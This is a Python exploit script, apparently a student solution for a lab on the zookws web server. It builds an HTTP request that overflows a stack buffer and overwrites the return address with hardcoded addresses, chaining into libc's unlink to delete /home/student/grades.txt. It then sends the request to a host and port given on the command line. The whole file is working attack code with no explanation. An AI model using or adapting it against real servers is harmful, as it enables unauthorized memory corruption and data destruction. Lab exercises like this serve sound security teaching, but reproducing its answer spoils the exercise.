#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct

####
addr_rbp = 0x7fffffffecf8
addr_buffer = 0x7fffffffdce0
addr_retaddr = 0x7fffffffecf8
addr_accident = 0x55555555588a
addr_unlink = 0x15555504cd40
offset = 8
file_path = b"/home/student/grades.txt\0"

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    shellcode = file_path
    shellcode += b"A" * ((addr_retaddr - addr_buffer) - len(shellcode) - 1)

    shellcode += struct.pack("<Q", addr_accident)
    shellcode += struct.pack("<Q", addr_unlink)
    shellcode += struct.pack("<Q", addr_buffer + 1)

    req =   b"GET /" + urllib.parse.quote_from_bytes(shellcode).encode('ascii') + b" HTTP/1.0\r\n\r\n"
    
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    sock.send(req)

    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    sock.close()
    return resp

####

if len(sys.argv) != 3:
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

